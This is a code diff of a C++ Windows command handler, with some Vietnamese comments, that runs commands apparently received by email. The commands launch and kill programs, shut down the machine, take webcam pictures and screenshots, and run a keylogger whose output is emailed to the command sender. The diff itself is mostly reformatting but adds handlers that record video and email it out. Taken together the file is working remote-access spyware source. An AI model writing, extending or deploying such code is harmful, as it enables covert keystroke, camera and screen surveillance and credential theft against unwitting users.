@@ -1,10 +1,12 @@
 #include "executeCommand.h"
 
+using namespace std;
+
 thread_local string g_current_sender;  // người nhận hiện tại
 
 static string trim_command_internal(string command) {
   command.erase(command.begin(), find_if(command.begin(), command.end(),
-                                         [](int ch) { return !isspace(ch); }));
+                                        [](int ch) { return !isspace(ch); }));
   command.erase(find_if(command.rbegin(), command.rend(),
                         [](int ch) { return !isspace(ch); })
                     .base(),
@@ -15,7 +17,7 @@ static string trim_command_internal(string command) {
 void handle_start_program(const string& command) {
   string prog = command.substr(13);  // After "start_program"
   prog.erase(prog.begin(), find_if(prog.begin(), prog.end(),
-                                   [](int ch) { return !isspace(ch); }));
+                                  [](int ch) { return !isspace(ch); }));
 
   if (!prog.empty()) {
     cout << "Starting program: " << prog << endl;
@@ -23,43 +25,43 @@ void handle_start_program(const string& command) {
         ShellExecuteA(NULL, "open", prog.c_str(), NULL, NULL, SW_SHOWDEFAULT);
     if (reinterpret_cast<INT_PTR>(result) <= 32) {
       cerr << "Failed to start program. Error code: "
-           << reinterpret_cast<INT_PTR>(result) << endl;
+          << reinterpret_cast<INT_PTR>(result) << endl;
       if (!g_current_sender.empty()) {
         send_email_with_attachment(g_current_sender, "start_program failed",
-                                   "Failed to start: " + prog, "");
+                                  "Failed to start: " + prog, "");
       }
     } else {
       if (!g_current_sender.empty()) {
         send_email_with_attachment(g_current_sender, "start_program succeeded",
-                                   "Started program: " + prog, "");
+                                  "Started program: " + prog, "");
       }
     }
   } else if (!g_current_sender.empty()) {
     send_email_with_attachment(g_current_sender, "start_program",
-                               "No program specified.", "");
+                              "No program specified.", "");
   }
 }
 
 void handle_shutdown_program(const string& command) {
   string proc = command.substr(16);
   proc.erase(proc.begin(), find_if(proc.begin(), proc.end(),
-                                   [](int ch) { return !isspace(ch); }));
+                                  [](int ch) { return !isspace(ch); }));
 
   if (!proc.empty()) {
     shutdown_program(proc);
     if (!g_current_sender.empty()) {
       send_email_with_attachment(g_current_sender, "shutdown_program",
-                                 "Shutdown program: " + proc, "");
+                                "Shutdown program: " + proc, "");
     }
   } else if (!g_current_sender.empty()) {
     send_email_with_attachment(g_current_sender, "shutdown_program",
-                               "No process specified.", "");
+                              "No process specified.", "");
   }
 }
 
 void handle_get_picture() {
   send_picture();  // tự gửi hình trong đó
-                   // send_picture() hiện gửi luôn mail; không cần gửi thêm
+                  // send_picture() hiện gửi luôn mail; không cần gửi thêm
 }
 
 void handle_get_screenshot() {
@@ -76,11 +78,11 @@ void handle_shutdown() {
     cerr << "Shutdown command failed" << endl;
     if (!g_current_sender.empty()) {
       send_email_with_attachment(g_current_sender, "shutdown",
-                                 "Shutdown command failed", "");
+                                "Shutdown command failed", "");
     }
   } else if (!g_current_sender.empty()) {
     send_email_with_attachment(g_current_sender, "shutdown",
-                               "Shutdown initiated", "");
+                              "Shutdown initiated", "");
   }
 }
 
@@ -94,8 +96,22 @@ void handle_keylogger(const string& command) {
   start_keylogger("keylog.txt", duration);
   if (!g_current_sender.empty()) {
     send_email_with_attachment(g_current_sender, "Keylogger output",
-                               "Attached keylog", "keylog.txt");
+                              "Attached keylog", "keylog.txt");
   }
+}
+
+void handle_start_recording() {
+  cout << "Starting recording..." << endl;
+  start_recording();
+  if (!g_current_sender.empty()) {
+    send_email_with_attachment(g_current_sender, "Recording Started",
+                              "Video recording has been started.", "");
+  }
+}
+
+void handle_stop_recording() {
+  cout << "Stopping recording..." << endl;
+  stop_and_send_recording();  // This function sends the video via email internally
 }
 
 void execute_command(const string& command) {
@@ -121,12 +137,16 @@ void execute_command(const string& command) {
     handle_shutdown();
   } else if (trimmed_cmd.find("keylogger") == 0) {
     handle_keylogger(trimmed_cmd);
+  } else if (trimmed_cmd.find("start_recording") == 0) {
+    handle_start_recording();
+  } else if (trimmed_cmd.find("stop_recording") == 0) {
+    handle_stop_recording();
   } else {
     cout << "Unknown command: " << trimmed_cmd << endl;
     if (!g_current_sender.empty()) {
       send_email_with_attachment(g_current_sender, "Unknown command",
-                                 "Received unknown command: " + trimmed_cmd,
-                                 "");
+                                "Received unknown command: " + trimmed_cmd,
+                                "");
     }
   }
 }
